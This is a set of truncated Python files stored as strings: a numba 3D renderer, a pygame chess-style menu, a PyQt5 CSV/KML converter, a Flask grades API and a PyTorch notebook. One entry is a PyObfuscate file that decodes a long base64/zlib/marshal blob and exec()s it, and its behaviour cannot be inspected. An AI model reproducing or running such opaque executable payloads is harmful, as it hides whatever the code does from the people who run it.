    "import numpy\nimport math\nfrom math import pi\nfrom numba.typed import List\nimport numba\n\n\n@numba.jit(nopython=True)\ndef make_2d(arraylist):\n    n = len(arraylist)\n    k = arraylist[0].shape[0]\n    a2d = numpy.zeros((n, k))\n    for i in range(n):\n        a2d[i] = arraylist[i]\n    return a2d\n\n\n@numba.jit(nopython=True)\ndef check_cross(N, M, point):  ##\u8fd0\u7528SH\u7b97\u6cd5 N\u4e3a\u6cd5\u5411\u91cf\uff0cM\u4e3a\u5e73\u9762\u4e00\u70b9\n    my_list = List()\n    for i in range(-1, point.shape[1] - 1):\n        flag = float(numpy.dot(point[:, i] - point[:, i + 1], N))\n        if flag == 0.0:\n            if not float(numpy.dot(point[:, i] - M, N)) > 0.0:\n                my_list.append(point[:, i + 1])\n        else:\n            t = float(numpy.dot(M - point[:, i + 1], N)) / flag\n            if (t > 1.0 and flag > 0.0) or (t < 0.0 and flag < 0.0):\n                my_list.append(point[:, i + 1])\n            elif 0.0 <= t <= 1.0:\n                if not t == 1.0:\n                    my_list.append(t * point[:, i] + (1 - t) * point[:, i + 1])\n                if flag > 0.0 and not t == 0.0:\n                    my_list.append(point[:, i + 1])\n    return my_list\n\n\n@numba.jit(nopython=True)\ndef hit_3(point, trans, camera_dest, color, sight_dist):  ##\u5c4e\u5c71\u7b2c\u4e09\u5c42\u4e4b\u6700\u7ec8\u6267\u884c\n    after_trans = trans @ (\n        point\n        - camera_dest\n        @ numpy.expand_dims(numpy.array(((1, 1, 1, 1))).astype(numpy.float64), axis=0)\n    )\n    distance = numpy.array((0.0, 0.0, 0.0, 0.0))\n    for i in range(4):\n        distance[i] = math.sqrt(\n            (camera_dest[0, 0] - point[0, i]) ** 2\n            + (camera_dest[1, 0] - point[1, i]) ** 2\n            + (camera_dest[2, 0] - point[2, i]) ** 2\n        )\n    M_lists = (\n        numpy.array((1, 0.0, 0.0)),\n        numpy.array((0.0, 0.0, 0.0)),\n        numpy.array((0.0, 0.0, 0.0)),\n        numpy.array((0.0, 0.0, 0.0)),\n        numpy.array((0.0, 0.0, 0.0)),\n    )\n    N_lists = (\n        numpy.array((-1.0, 0.0, 0.0)),\n        numpy.array((-6.4, 0.0, -10.0)),\n        numpy.array((-3.6, -10.0, 0.0)),\n        numpy.array((-6.4, 0.0, 10.0)),\n        numpy.array((-3.6, 10.0, 0.0)),\n    )\n    for i in range(5):\n        temp = check_cross(N_lists[i], M_lists[i], after_trans)\n        if len(temp) < 3:\n            return after_trans, -1.0, color\n        after_trans = make_2d(temp).T\n    for i in range(after_trans.shape[1]):\n        after_trans[:, i] *= sight_dist / float(after_trans[0, i])\n    if after_trans.shape[1] < 2:\n        return after_trans, -1.0, color\n    S = 0.0\n    for i in range(-1, after_trans.shape[1] - 1):\n        S += (\n            after_trans[2, i] * after_trans[1, i + 1]\n            - after_trans[2, i + 1] * after_trans[1, i]\n        )  ##\u978b\u5e26\u516c\u5f0f\n    if S < 0.0:\n        return after_trans, -1.0, color\n    return after_trans, distance.max(), color\n\n\n@numba.jit(nopython=True)\ndef mat_dot(a, b):\n    return (a @ b).astype(numpy.float64)\n\n\nclass Camera:\n    __slots__ = \"dest\", \"vision\", \"sight_dist\", \"rotate_statue\", \"on_move\"\n\n    def __init__(self, x, z, y=20):\n        self.dest = numpy.array([[x], [y], [z]]).astype(numpy.float64)\n        self.vision = [\n            0,\n            0,\n        ]  ##\u7b2c\u4e00\u4e2a\u5143\u7d20\u8868\u793a\u822a\u5411\u89d2\uff08\u4ee5x\u6b63\u65b9\u5411\u4e3a\u6781\u8f74\u9006\u65f6\u9488\u8f6c\uff09\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u8868\u793a\u4fef\u4ef0\u89d2\uff08\u4ee5\u5411\u4e0a\u4e3a\u6b63\uff0c\u6709\u6700\u5927\u503c\uff09\n        self.sight_dist = 10  ##\u8868\u793a\u6295\u5f71\u5e73\u9762\u5230\u89c6\u7ebf\u70b9\u7684\u8ddd\u79bb\n        self.rotate_statue = \"\"\n        self.on_move = [\n            False,\n            False,\n            False,\n            False,\n            False,\n            False,\n        ]  ##\u8fd0\u52a8\u72b6\u6001\uff0c\u6309\u524d\u5de6\u540e\u53f3\u4e0a\u4e0b\u6392\u5217\n\n    def get_trans_mat(\n        self,\n    ):  ##\u83b7\u5f97\u4ece\u539f\u5750\u6807\u7cfb\u5230\u76f8\u673a\u5750\u6807\u7cfb\u7684\u65cb\u8f6c\u77e9\u9635 \u6ce8\u610f\uff1a\u9700\u8981\u51cf\u53bbcamera\u5750\u6807\uff01\n        return mat_dot(\n            numpy.array(\n                (\n                    (math.cos(-self.vision[1]), -math.sin(-self.vision[1]), 0),\n                    (math.sin(-self.vision[1]), math.cos(-self.vision[1]), 0),\n                    (0, 0, 1),\n                )\n            ),\n            numpy.array(\n                (\n                    (math.cos(-self.vision[0]), 0, math.sin(-self.vision[0])),\n                    (0, 1, 0),\n                    (-math.sin(-self.vision[0]), 0, math.cos(-self.vision[0])),\n                )\n            ),\n        )\n\n\nclass Wall:\n    __slots__ = \"point\", \"color\"\n\n    def __init__(self, point, color):\n        self.point = point.astype(numpy.float64)\n        self.color = color\n\n    def hit(self, trans, camera: Camera):\n        return hit_3(self.point, trans, camera.dest, self.color, camera.sight_dist)\n\n\n@numba.jit(nopython=True)\ndef hit_2(\n    wall_array: tuple, trans, camera_dest, sight_dist, color_list: tuple\n):  ##\u5c4e\u5c71\u7b2c\u4e8c\u5c42\u4e4b\u5faa\u73af\n    result = List()\n    for i in range(len(wall_array)):\n        x = hit_3(wall_array[i], trans, camera_dest, color_list[i], sight_dist)\n        if not x[1] == -1.0:\n            result.append(\n                x,\n            )\n    return result\n\n\ndef hit_1(\n    wall_list: list[Wall], trans, camera: Camera\n):  ##\u5c4e\u5c71\u7b2c\u4e00\u5c42\u4e4b\u5c06wall\u5bf9\u8c61\u8f6c\u5316\u4e3a\u6570\u7ec4\n    temp = []\n    temp_color = []\n    for i in wall_list:\n        temp.append(i.point.astype(numpy.float64))\n        temp_color.append(numpy.float64(i.color))\n    temp = tuple(temp)\n    temp_color = tuple(temp_col",
    "import pygame\r\nimport sys\r\n\r\npygame.init()\r\n\r\nWIDTH, HEIGHT = 800, 800\r\nWIN = pygame.display.set_mode((WIDTH, HEIGHT))\r\nWINDOW_TITLE = \"Rook-Game\"\r\npygame.display.set_caption(WINDOW_TITLE)\r\nicon = pygame.image.load('grafiki/icon.png')\r\npygame.display.set_icon(icon)\r\n\r\nWHITE = (255, 255, 255)\r\nBLACK = (0, 0, 0)\r\nGRAY = (128, 128, 128)\r\n\r\nclass Button():\r\n    def __init__(self, text, width, height, pos, elevation, color, hover):\r\n        self.elevation = elevation\r\n        self.original_y_pos = pos[1]\r\n        self.color = color\r\n        self.hover = hover\r\n        self.clicked = False\r\n        self.top_rect = pygame.Rect(pos,(width,height))\r\n        self.top_color = color\r\n        self.bottom_rect = pygame.Rect(pos,(width,height))\r\n        font = pygame.font.SysFont('rockwell', 50)\r\n        self.text_surf = font.render(text,True,(255,255,255))\r\n        self.text_rect = self.text_surf.get_rect(center = self.top_rect.center)\r\n        self.name = text\r\n    def check_action(self):\r\n        if self.name == \"Play\":\r\n            game = Game()\r\n            game.run()\r\n        elif self.name == \"Load\":\r\n            print(\"Wczytanie zapisanych\")\r\n            # tu bedzie zrobic zapisy wszystkie\r\n        elif self.name == \"Rules\":\r\n            print(\"Zasady\")\r\n            # tu trzeba bedzie dopisac\r\n        elif self.name == \"Settings\":\r\n            print(\"Ustawienia\")\r\n            # tutaj przyciski z ustawieniami\r\n        elif self.name == \"Quit\":\r\n            pygame.quit()\r\n            sys.exit()\r\n\r\n    def draw_button(self, screen):\r\n        action = False\r\n        pos = pygame.mouse.get_pos()\r\n        top_rect = self.top_rect.copy()\r\n        bottom_rect = self.bottom_rect.copy()\r\n        bottom_rect.x += 20\r\n        bottom_rect.y += 20\r\n        if top_rect.collidepoint(pos):\r\n            self.top_color = self.hover\r\n            if pygame.mouse.get_pressed()[0]:\r\n                self.clicked = True\r\n                bottom_rect.inflate_ip(self.elevation, self.elevation)\r\n                top_rect.inflate_ip(self.elevation, self.elevation)\r\n\r\n            elif pygame.mouse.get_pressed()[0] == 0 and self.clicked == True:\r\n                self.clicked = False\r\n                action = True\r\n                self.check_action()\r\n            self.top_color = self.hover\r\n        else:\r\n            self.top_color = self.color\r\n\r\n        bottom_surf = pygame.Surface(bottom_rect.size, pygame.SRCALPHA)\r\n        pygame.draw.rect(bottom_surf, 0, (0, 0, *bottom_rect.size), border_radius = 12)\r\n        screen.blit(bottom_surf, bottom_rect.topleft)\r\n\r\n        top_surf = pygame.Surface(top_rect.size, pygame.SRCALPHA)\r\n        pygame.draw.rect(top_surf, self.top_color, (0, 0, *top_rect.size), border_radius = 12)\r\n        screen.blit(top_surf, top_rect.topleft)\r\n\r\n        screen.blit(self.text_surf, self.text_rect)\r\n        return action\r\n\r\ndef main():\r\n    start_button = Button(\"Play\", 250, 125, (300, 25), 20, (128, 128, 255, 128), (255, 128, 255, 128))\r\n    load_button = Button(\"Load\", 250, 125, (300, 175), 20, (128, 128, 255, 128), (255, 128, 255, 128))\r\n    rules_button = Button(\"Rules\", 250, 125, (300, 325), 20, (128, 128, 255, 128), (255, 128, 255, 128))\r\n    settings_button = Button(\"Settings\", 250, 125, (300, 475), 20, (128, 128, 255, 128), (255, 128, 255, 128))\r\n    quit_button = Button(\"Quit\", 250, 125, (300, 625), 20, (128, 128, 255, 128), (255, 128, 255, 128))\r\n    background_image = pygame.image.load(\"grafiki/tlo.png\").convert()\r\n\r\n    while True:\r\n        for event in pygame.event.get():\r\n            if event.type == pygame.QUIT:\r\n                pygame.quit()\r\n                sys.exit()\r\n        WIN.fill((255, 255, 255))\r\n        WIN.blit(background_image, (0, 0))\r\n        start_button.draw_button(WIN)\r\n        load_button.draw_button(WIN)\r\n        rules_button.draw_button(WIN)\r\n        settings_button.draw_button(WIN)\r\n        quit_button.draw_button(WIN)\r\n        pygame.display.update()\r\n\r\nclass Game:\r\n    def __init__(self):\r\n        #pygame.init()\r\n\r\n        self.SZER = 800\r\n        self.WYS = 800\r\n        self.screen = pygame.display.set_mode([self.SZER, self.WYS])\r\n        self.font = pygame.font.Font('font/Truecat.ttf', 50)\r\n        self.zegar = pygame.time.Clock()\r\n        self.fps = 60\r\n        self.tlo = 'wheat3'\r\n        self.kolor_jasny = 'wheat'\r\n        self.kolor_ciemny = 'wheat1'\r\n        self.WINDOW_TITLE = \"Rook-Game\"\r\n        pygame.display.set_caption(self.WINDOW_TITLE)\r\n        self.icon = pygame.image.load('grafiki/icon.png')\r\n        pygame.display.set_icon(self.icon)\r\n\r\n        self.etap = 0\r\n        self.wsje_ruchy = []\r\n\r\n        self.biale_grafiki = [pygame.transform.scale(pygame.image.load('grafiki/biala.png'), (80, 80))]\r\n        self.czarne_grafiki = [pygame.transform.scale(pygame.image.load('grafiki/czarna.png'), (80, 80))]\r\n\r\n        self.pola_bialych = [(0, 0), (1, 0), (2, 0), (3, 0), (4, 0), (5, 0), (6, 0), (7, 0), (0, 1), (1, 1), (2, 1), (3, 1), (4, 1), (5, 1), (6, 1), (7, 1)]\r\n        sel",
    "import sys\r\nimport os\r\nimport csv\r\nimport simplekml\r\nimport pandas as pd\r\nfrom pandas import IntervalIndex\r\nfrom PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QPushButton, QFileDialog, QMainWindow, QLabel, QFrame, QSizePolicy, QDialog, QLineEdit, QHBoxLayout, QDialog, QLineEdit, QVBoxLayout\r\nfrom PyQt5.QtCore import Qt\r\nfrom PyQt5.QtGui import QColor, QScreen\r\nimport math\r\nfrom math import cos, sin, radians, sqrt, atan2, degrees\r\nimport re\r\nimport numpy as np\r\n\r\n#create csv files if they arent already\r\ndef is_csv_file(filename):\r\n    _, ext = os.path.splitext(filename)\r\n    return ext.lower() == '.csv'\r\n\r\n#converts a text file to a csv file\r\ndef convert_to_csv(input_file_path, output_file_path):\r\n    #opens both files\r\n    with open(input_file_path, 'r') as input, open(output_file_path, 'w', newline='') as output:\r\n        #creates the csv writer\r\n        csv_writer = csv.writer(output)\r\n        for line in input:\r\n            #this will write each row, also the values are seperated by tabs not spaces in the text file, adjust as necesarry\r\n            fields = line.strip().split('\\t')\r\n            csv_writer.writerow(fields)\r\n\r\ndef create_circle(lat, long, radius):\r\n    circle_points = []\r\n\r\n    for i in range(360):\r\n        theta = math.radians(i)\r\n        dlat = (radius * math.cos(theta)) / 111319.9\r\n        dlon = (radius * math.sin(theta)) / (111319.9 * math.cos(math.radians(lat)))\r\n        circle_points.append((long + dlon, lat + dlat))\r\n    return circle_points\r\n    \r\ndef dms_to_decimal(dms_str):\r\n    pattern = r\"(\\d+)\u00b0(\\d+)'([\\d.]+)\\\"([NESW])\"\r\n\r\n    match = re.match(pattern, dms_str)\r\n    if not match:\r\n        raise ValueError(f\"INVALID DMS FORMAT {dms_str}\")\r\n        \r\n    degrees, minutes, seconds, direction = match.groups()\r\n    decimal = float(degrees) + float(minutes) / 60 + float(seconds) / 3600\r\n\r\n    if direction in ['S', 'W']:\r\n        decimal = -decimal\r\n    return decimal\r\n\r\n# Drag and drop widget for file selection\r\nclass DragDropWidget(QWidget):\r\n    def __init__(self, title, allow_multiple_files=False, parent=None):\r\n        super(DragDropWidget, self).__init__(parent)\r\n        self.setAcceptDrops(True)\r\n        self.file_paths = []  # Store multiple file paths\r\n        self.allow_multiple_files = allow_multiple_files  # Whether to allow selecting multiple files\r\n\r\n        self.layout = QVBoxLayout()\r\n        self.titleLabel = QLabel(title)\r\n        self.layout.addWidget(self.titleLabel)\r\n\r\n        self.button = QPushButton('Select File(s)')\r\n        self.button.clicked.connect(self.select_file)\r\n        self.layout.addWidget(self.button)\r\n\r\n        self.selectedFilesLabel = QLabel('No file(s) selected')\r\n        self.layout.addWidget(self.selectedFilesLabel)\r\n\r\n        self.setLayout(self.layout)\r\n\r\n    def update_selected_files_label(self):\r\n        if not self.file_paths:\r\n            self.selectedFilesLabel.setText(\"No file(s) selected\")\r\n        else:\r\n            files_str = \"; \".join(os.path.basename(path) for path in self.file_paths)\r\n            self.selectedFilesLabel.setText(f\"Selected file(s): {files_str}\")\r\n\r\n    def dragEnterEvent(self, event):\r\n        if event.mimeData().hasUrls():\r\n            event.acceptProposedAction()\r\n\r\n    def dropEvent(self, event):\r\n        if self.allow_multiple_files:\r\n            self.file_paths = [str(url.toLocalFile()) for url in event.mimeData().urls()]\r\n        else:\r\n            self.file_paths = [str(event.mimeData().urls()[0].toLocalFile())]\r\n        self.update_selected_files_label()\r\n\r\n    def select_file(self):\r\n        if self.allow_multiple_files:\r\n            self.file_paths, _ = QFileDialog.getOpenFileNames(self, 'Select File(s)')\r\n        else:\r\n            file_path, _ = QFileDialog.getOpenFileName(self, 'Select File')\r\n            if file_path:\r\n                self.file_paths = [file_path]\r\n        self.update_selected_files_label()\r\n\r\n\r\n# Window for converting .txt to .csv\r\nclass ConvertTxtToCsvWindow(QDialog):\r\n    def __init__(self):\r\n        super().__init__()\r\n        self.setWindowTitle('Convert .txt to .csv')\r\n        self.resize(800, 600)\r\n\r\n        self.layout = QVBoxLayout()\r\n        self.fileWidget = DragDropWidget('Select .txt file here')\r\n        self.layout.addWidget(self.fileWidget)\r\n\r\n        self.convertButton = QPushButton('Convert to CSV')\r\n        self.convertButton.clicked.connect(self.convert_to_csv)\r\n        self.layout.addWidget(self.convertButton)\r\n\r\n        self.setLayout(self.layout)\r\n\r\n    def convert_to_csv(self):\r\n        if self.fileWidget.file_paths:\r\n            input_file_path = self.fileWidget.file_paths[0]\r\n            #input_file_path = self.fileWidget.file_path\r\n\r\n            #this creates the file path\r\n            input_dir, input_file_name = os.path.split(input_file_path)\r\n            new_file_name = \"CSV_\" + input_file_name.replace('.txt', '.csv')\r\n            output_file_path = os.path.join(input_dir, new_file_name)\r\n\r\n            #this will open the txt file and writ",
    "# Obfuscated with PyObfuscate\n# https://www.github.com/htr-tech\n# Time : Fri Apr 12 20:06:35 2024\n# -------------------------------\n_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=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",
    "from flask import Flask, jsonify, render_template, abort, request\napp = Flask(__name__)\n\nalunos = {\n   \"1\" : {'nome': 'Eduardo',\n        'nota': [10,9.6,8]},\n   \"2\": {'nome': 'Bianca',\n        'nota': [1,6,4]},\n   \"3\" : {'nome': 'Carlos',\n        'nota': [2,9.6,10]},\n}\n\n\n@app.route('/')\ndef hello():\n    return render_template(\"index.html\")\n        \n@app.route('/alunos')\ndef getAlunos():\n    return jsonify(alunos),200\n\n@app.route('/alunos/<int:indice>')\ndef getAluno(indice):\n    if indice in alunos.keys():\n        return jsonify(alunos.get(indice)),200\n\n    else:\n        return jsonify(\"Pagina n\u00e3o encontrada\", abort(404))\n\n@app.route('/alunos', methods=['POST'])\ndef postAluno():\n    data = request.get_json()\n    if not data:\n        return jsonify({'error': 'Nenhum JSON encontrado no corpo da requisi\u00e7\u00e3o'}), 400\n    \n    indice = data.get('indice')\n    nome = data.get('nome')\n\n    if indice is None or nome is None:\n        return jsonify({'error': '\u00cdndice e nome s\u00e3o campos obrigat\u00f3rios'}), 400\n\n    if indice in alunos:\n        return jsonify({'error': 'Dados n\u00e3o podem ser inseridos, \u00edndice existente'}), 409\n    \n    else:\n        alunos[indice] = {'nome': nome, 'nota': []}\n        return jsonify({'message': 'Dados inseridos com sucesso'}), 200\n    \n@app.route('/notas', methods=['POST'])\ndef postNotas():\n    \n    data = request.get_json()\n    if not data:\n        return jsonify({'error': 'Nenhum JSON encontrado no corpo da requisi\u00e7\u00e3o'}), 400\n    \n    indice = data.get('indice')\n    nota = data.get('nota')\n\n    if indice is None or nota is None:\n        return jsonify({'error': '\u00cdndice e notas s\u00e3o campos obrigat\u00f3rios'}), 400\n\n    if indice in alunos:\n        alunos[indice]['nota'].append(nota)\n        return jsonify({'message': 'Dados inseridos com sucesso'}), 200\n        \n    else:\n        return jsonify({'error': 'Dados n\u00e3o podem ser inseridos, \u00edndice existente'}), 409\n\nif __name__ == '__main__':\n    app.run(debug=True)",
    "\"\"\"Untitled0.ipynb\n\nAutomatically generated by Colab.\n\nOriginal file is located at\n    https://colab.research.google.com/drive/12ubbgXyimQ3cxRhotvRVnCEkJqma3f2b\n\"\"\"\n\nimport torch\nimport os\nimport torchvision\nimport numpy as np\nimport matplotlib\nimport matplotlib.pyplot as plt\nimport torch.nn as nn\nfrom PIL import Image\nimport torch.nn.functional as F\nfrom torchvision.datasets import ImageFolder\nfrom torchvision.datasets import DatasetFolder\nimport torchvision.transforms as transforms\nfrom torchvision.datasets import MNIST\nfrom torchvision.transforms import ToTensor\nfrom torchvision.utils import make_grid\nfrom torch.utils.data.dataloader import DataLoader\nfrom torch.utils.data import random_split\nfrom torch.utils.data import Dataset, DataLoader\n\n# device = torch.device(\"cpu\")\n\n# %matplotlib inline\n# class Potato(nn.Module):\n#     def training_step(self, batch):\n#         images, labels = batch\n#         out = self(images)                  # Generate predictions\n#         loss = F.cross_entropy(out, labels) # Calculate loss\n#         return loss\n\n#     def validation_step(self, batch):\n#         images, labels = batch\n#         out = self(images)                    # Generate predictions for each batch\n#         loss = F.cross_entropy(out, labels)   # Calculate loss for each batch\n#         acc = accuracy(out, labels)           # Calculate accuracy for each batch\n#         return {'val_loss': loss.detach(), 'val_acc': acc}\n\n#     def validation_epoch_end(self, outputs):\n#         batch_losses = [x['val_loss'] for x in outputs]\n#         epoch_loss = torch.stack(batch_losses).mean()   # Combine losses\n#         batch_accs = [x['val_acc'] for x in outputs]\n#         epoch_acc = torch.stack(batch_accs).mean()      # Combine accuracies\n#         return {'val_loss': epoch_loss.item(), 'val_acc': epoch_acc.item()}\n\n#     def epoch_end(self, epoch, result):\n#         print(\"Epoch [{}], train_loss: {:.4f}, val_loss: {:.4f}, val_acc: {:.4f}\".format(\n#             epoch, result['train_loss'], result['val_loss'], result['val_acc']))\n\n# def accuracy(outputs, labels):\n#     _, preds = torch.max(outputs, dim=1)\n#     return torch.tensor(torch.sum(preds == labels).item() / len(preds))\n\n# def conv_block(in_channels, out_channels, pool=False):\n#     layers = [nn.Conv2d(in_channels, out_channels, kernel_size=3, padding=1),\n#               nn.BatchNorm2d(out_channels),\n#               nn.ReLU(inplace=True)]\n#     if pool: layers.append(nn.MaxPool2d(2))\n#     return nn.Sequential(*layers)\n\n# class ResNet9(Potato):\n#     def __init__(self, in_channels, num_classes):\n#         super().__init__()\n\n#         self.conv1 = conv_block(in_channels, 64)  #64 x 256 x 256\n#         self.conv2 = conv_block(64, 128, pool=True) #128 x 128 x 128\n#         self.res1 = nn.Sequential(conv_block(128, 128), conv_block(128, 128)) #128 x 128 x 128\n\n#         self.conv3 = conv_block(128, 256, pool=True)\n#         